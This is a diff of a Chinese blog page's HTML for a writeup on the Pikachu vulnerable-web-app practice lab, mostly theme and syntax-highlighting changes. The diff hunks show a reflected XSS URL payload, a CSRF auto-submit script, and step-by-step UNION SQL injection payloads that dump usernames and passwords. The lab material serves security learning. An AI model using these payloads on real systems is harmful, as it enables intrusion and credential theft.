@@ -66,18 +66,13 @@
 <link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
 
 
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"justloseit.top","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":5},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"snI2XNrHrhyx5g84m3Uim3EC-gzGzoHsz","app_key":"x2YseXJIHmvnsM4v9y9UAlvu","server_url":"https://sni2xnrh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"ui":{"search":{"loading":"正在加载搜索索引…","prompt":"输入关键词搜索文章","error":"搜索加载失败，请重试","retry":"重新加载","empty":"没有找到匹配的文章","count":"找到 {count} 篇文章","more":"显示更多"},"copy":"复制代码","copied":"已复制","copyFailed":"复制失败，请选中代码后手动复制","tocExpand":"展开章节","tocCollapse":"收起章节"},"hostname":"justloseit.top","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":5},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"snI2XNrHrhyx5g84m3Uim3EC-gzGzoHsz","app_key":"x2YseXJIHmvnsM4v9y9UAlvu","server_url":"https://sni2xnrh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -353,7 +348,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Pikachu 靶场 Writeup"></span>
+            <span id="subtitle">Pikachu 靶场 Writeup</span>
           
         </div>
 
@@ -381,7 +376,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.3k 字
+          7k 字
         
       </span>
     
@@ -392,7 +387,7 @@
         
         
         
-          61 分钟
+          59 分钟
         
       </span>
     
@@ -555,7 +550,8 @@
 <ol>
 <li>直接通过 Hackbar，发送 Payload</li>
 </ol>
-  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/pikachu/</span>vul<span class="hljs-regexp">/xss/</span>xss_reflected_get.php?message=&lt;script&gt;alert(<span class="hljs-regexp">/xss/</span>)&lt;/script&gt;&amp;submit=submit<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="text"><code><span class="line"><span>http://localhost/pikachu/vul/xss/xss_reflected_get.php?message=&#x3C;script>alert(/xss/)&#x3C;/script>&#x26;submit=submit#</span></span>
+<span class="line"><span></span></span></code></pre></div>
 <ol start="2">
 <li>删除前端关于字符数限制的 JavaScript 代码</li>
 </ol>
@@ -655,7 +651,12 @@
 <ul>
 <li>
 <p>不过这个 poc 没有加入自动提交表单，所以加个自动点击提交按钮就行</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">          <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;postsubmit&quot;</span>).<span class="hljs-title function_">click</span>();</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="html"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">&#x3C;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">></span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">      window.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">onload</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583"> function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> () {</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">          document.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">getElementById</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"postsubmit"</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">).</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">click</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">();</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">      }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">&#x3C;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">></span></span>
+<span class="line"></span></code></pre></div>
 </li>
 <li>
 <p>放到服务器目录下，然后点击链接即可触发</p>
@@ -692,21 +693,90 @@
 <li>BurpSuite 抓包，在 Repeater 中修改 id，查看响应结果。</li>
 <li>payload：</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 判断注入类型。【说明是数字型】<br>id=1 and 1 = 1<br>id=1 and 1 = 2<br><br># 确定字段（列）数。【后者报错，说明字段（列）数为 2】<br>id=1 order by 2 <br>id=1 order by 3 <br><br># 联合查询查看显示位。【有两个显示位】<br>id=0 union select 1,2 <br><br># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】<br>id=0 union select 1,group_concat(schema_name) from information_schema.schemata<br>## 或者<br>id=0 union select 1,database()<br><br># 爆表名。【得到表名 ...users...】<br>id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() <br><br># 爆列名。【得到列名 ...username,password...】<br>id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; <br><br># 爆值。【得到用户名-密码对】<br>id=0 union select 1,group_concat(username,&#x27;-&#x27;,password) from users<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="mysql"><code><span class="line"><span># 判断注入类型。【说明是数字型】</span></span>
+<span class="line"><span>id=1 and 1 = 1</span></span>
+<span class="line"><span>id=1 and 1 = 2</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 确定字段（列）数。【后者报错，说明字段（列）数为 2】</span></span>
+<span class="line"><span>id=1 order by 2 </span></span>
+<span class="line"><span>id=1 order by 3 </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 联合查询查看显示位。【有两个显示位】</span></span>
+<span class="line"><span>id=0 union select 1,2 </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】</span></span>
+<span class="line"><span>id=0 union select 1,group_concat(schema_name) from information_schema.schemata</span></span>
+<span class="line"><span>## 或者</span></span>
+<span class="line"><span>id=0 union select 1,database()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆表名。【得到表名 ...users...】</span></span>
+<span class="line"><span>id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆列名。【得到列名 ...username,password...】</span></span>
+<span class="line"><span>id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆值。【得到用户名-密码对】</span></span>
+<span class="line"><span>id=0 union select 1,group_concat(username,'-',password) from users</span></span>
+<span class="line"><span></span></span></code></pre></div>
 <h3 id="字符型注入get"><a class="markdownIt-Anchor" href="#字符型注入get"></a> 字符型注入（get）</h3>
 <ul>
 <li>payload：</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 判断注入类型。【说明是字符型】<br>id=1&#x27; or 1=1#<br>id=1&#x27; or 1=2#<br><br># 确定字段（列）数。【后者报错，说明字段（列）数为 2】<br>id=1&#x27; order by 2#<br>id=1&#x27; order by 3# <br><br># 联合查询查看显示位。【有两个显示位】<br>id=0&#x27; union select 1,2# <br><br># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】<br>id=0&#x27; union select 1,group_concat(schema_name) from information_schema.schemata#<br>## 或者<br>id=0&#x27; union select 1,database()#<br><br># 爆表名。【得到表名 ...users...】<br>id=0&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# <br><br># 爆列名。【得到列名 ...username,password...】<br>id=0&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#<br><br># 爆值。【得到用户名-密码对】<br>id=0&#x27; union select 1,group_concat(username,&#x27;-&#x27;,password) from users#<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="mysql"><code><span class="line"><span># 判断注入类型。【说明是字符型】</span></span>
+<span class="line"><span>id=1' or 1=1#</span></span>
+<span class="line"><span>id=1' or 1=2#</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 确定字段（列）数。【后者报错，说明字段（列）数为 2】</span></span>
+<span class="line"><span>id=1' order by 2#</span></span>
+<span class="line"><span>id=1' order by 3# </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 联合查询查看显示位。【有两个显示位】</span></span>
+<span class="line"><span>id=0' union select 1,2# </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】</span></span>
+<span class="line"><span>id=0' union select 1,group_concat(schema_name) from information_schema.schemata#</span></span>
+<span class="line"><span>## 或者</span></span>
+<span class="line"><span>id=0' union select 1,database()#</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆表名。【得到表名 ...users...】</span></span>
+<span class="line"><span>id=0' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆列名。【得到列名 ...username,password...】</span></span>
+<span class="line"><span>id=0' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆值。【得到用户名-密码对】</span></span>
+<span class="line"><span>id=0' union select 1,group_concat(username,'-',password) from users#</span></span>
+<span class="line"><span></span></span></code></pre></div>
 <h3 id="搜索型注入"><a class="markdownIt-Anchor" href="#搜索型注入"></a> 搜索型注入</h3>
 <ul>
 <li>使用上面的字符型注入方法也可实现注入，不过既然是新题，就考虑新的绕过方式。本题使用的查询语句为：</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select username,id,email from member where username like &#x27;%$name%&#x27;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="mysql"><code><span class="line"><span>select username,id,email from member where username like '%$name%'</span></span>
+<span class="line"><span></span></span></code></pre></div>
 <ul>
 <li>所以 payload 为：</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 确定字段（列）数。【后者报错，说明字段（列）数为 3】<br>id=1%&#x27; order by 3#<br>id=1%&#x27; order by 4# <br><br># 联合查询查看显示位。【有三个显示位】<br>id=0%&#x27; union select 1,2,3# <br><br># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】<br>id=0%&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata#<br>## 或者<br>id=0%&#x27; union select 1,2,database()#<br><br># 爆表名。【得到表名 ...users...】<br>id=0%&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()# <br><br># 爆列名。【得到列名 ...username,password...】<br>id=0%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#<br><br># 爆值。【得到用户名-密码对】<br>id=0%&#x27; union select 1,2,group_concat(username,&#x27;-&#x27;,password) from users#<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre class="shiki shiki-themes github-light github-dark shiki-line-numbers" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0" data-language="mysql"><code><span class="line"><span># 确定字段（列）数。【后者报错，说明字段（列）数为 3】</span></span>
+<span class="line"><span>id=1%' order by 3#</span></span>
+<span class="line"><span>id=1%' order by 4# </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 联合查询查看显示位。【有三个显示位】</span></span>
+<span class="line"><span>id=0%' union select 1,2,3# </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】</span></span>
+<span class="line"><span>id=0%' union select 1,2,group_concat(schema_name) from information_schema.schemata#</span></span>
+<span class="line"><span>## 或者</span></span>
+<span class="line"><span>id=0%' union select 1,2,database()#</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆表名。【得到表名 ...users...】</span></span>
+<span class="line"><span>id=0%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()# </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆列名。【得到列名 ...username,password...】</span></span>
+<span class="line"><span>id=0%' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 爆值。【得到用户名-密码对】</span></span>
+<span class="line"><span>id=0%' union select 1,2,group_concat(username,'-',password) from users#</span></span>
+<span class="line"><span></span></span></code></pre></div>
 <div class="note note-success">
             <p>输入 id = %%，能够查询表中非 NULL 的值。这是因为 <code>like '%%'</code>默认为查询所有。(即 % 为通配符)</p> 
           </div>
@@ -875,12 +945,32 @@
     <div class="side-col d-none d-lg-block col-lg-2">
       
   <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
+    <div id="toc" data-toc-script="https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js">
   <p class="toc-header">
-    <i class="iconfont icon-list"></i>
+    <i class="iconfont icon-list" aria-hidden="true"></i>
     <span>目录</span>
   </p>
-  <div class="toc-body" id="toc-body"></div>
+  <nav class="toc-body" id="toc-body" aria-label="目录"></nav>
+</div>
+
+<button id="mobile-toc-toggle" class="mobile-toc-toggle d-lg-none" type="button" hidden
+        aria-controls="mobile-toc-dialog" aria-expanded="false" aria-haspopup="dialog">
+  <i class="iconfont icon-list" aria-hidden="true"></i> 目录
+</button>
+<div id="mobile-toc-dialog" class="modal" tabindex="-1" role="dialog"
+     aria-modal="true" aria-labelledby="mobile-toc-title" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 id="mobile-toc-title" class="modal-title w-100 font-weight-bold">目录</h4>
+        <button type="button" class="close" data-dismiss="modal"
+                aria-label="关闭">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3"></div>
+    </div>
+  </div>
 </div>
 
 
@@ -929,22 +1019,22 @@
     
 
     
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="local-search-title" aria-hidden="true">
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+      <div class="modal-header search-header">
+        <h4 id="local-search-title" class="sr-only">搜索</h4>
+        <label class="sr-only" for="local-search-input">关键词</label>
+        <i class="iconfont icon-search" aria-hidden="true"></i>
+        <input type="search" id="local-search-input" autocomplete="off" spellcheck="false"
+               placeholder="关键词" aria-describedby="local-search-status" aria-controls="local-search-result">
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="关闭">
           <span aria-hidden="true">&times;</span>
         </button>
       </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
+      <div class="modal-body search-body">
+        <p id="local-search-status" role="status" aria-live="polite" aria-atomic="true"></p>
+        <div id="local-search-result" aria-busy="false"></div>
       </div>
     </div>
   </div>
@@ -1042,21 +1132,6 @@
 <script  src="/js/plugins.js" ></script>
 
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
 
 
 
@@ -1067,109 +1142,7 @@
 
 
 
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    function isExpandAllEnabled() {
-      return CONFIG.toc && CONFIG.toc.expand_all === true;
-    }
-    function expandAllToc() {
-      if (!isExpandAllEnabled()) { return; }
-      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
-    }
-    function updateTocToggle($li, $childList) {
-      var $toggle = $li.children('.toc-toggle');
-      if ($toggle.length === 0) { return; }
-      var collapsed = $childList.hasClass('tocbot-is-collapsed');
-      $toggle
-        .toggleClass('toc-toggle-collapsed', collapsed)
-        .toggleClass('toc-toggle-expanded', !collapsed);
-    }
-    function bindTocToggle() {
-      if (!isExpandAllEnabled()) { return; }
-      jQuery('#toc-body .toc-list-item').each(function() {
-        var $li = jQuery(this);
-        var $childList = $li.children('ol');
-        if ($childList.length === 0) {
-          if ($li.children('.toc-toggle').length === 0) {
-            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
-          }
-          return;
-        }
-
-        if ($li.children('.toc-toggle').length === 0) {
-          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
-        }
-        updateTocToggle($li, $childList);
-      });
-      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        var $li = jQuery(this).parent('.toc-list-item');
-        var $childList = $li.children('ol');
-        if ($childList.length === 0) { return; }
-        $childList.toggleClass('tocbot-is-collapsed');
-        updateTocToggle($li, $childList);
-      });
-      if (!window.__tocToggleObserver) {
-        window.__tocToggleObserver = new MutationObserver(function(mutations) {
-          mutations.forEach(function(mutation) {
-            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
-            var $list = jQuery(mutation.target);
-            var $li = $list.parent('.toc-list-item');
-            if ($li.length === 0) { return; }
-            updateTocToggle($li, $list);
-          });
-        });
-        jQuery('#toc-body ol').each(function() {
-          window.__tocToggleObserver.observe(this, { attributes: true });
-        });
-      }
-    }
-    var tocConfig = Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc);
-    if (isExpandAllEnabled()) {
-      tocConfig.collapseDepth = 6;
-    }
-    window.tocbot.init(tocConfig);
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-    expandAllToc();
-    bindTocToggle();
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-        expandAllToc();
-        bindTocToggle();
-      }
-    });
-  });
-</script>
-
+  <script  src="/js/toc.js" ></script>
 
   <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
 
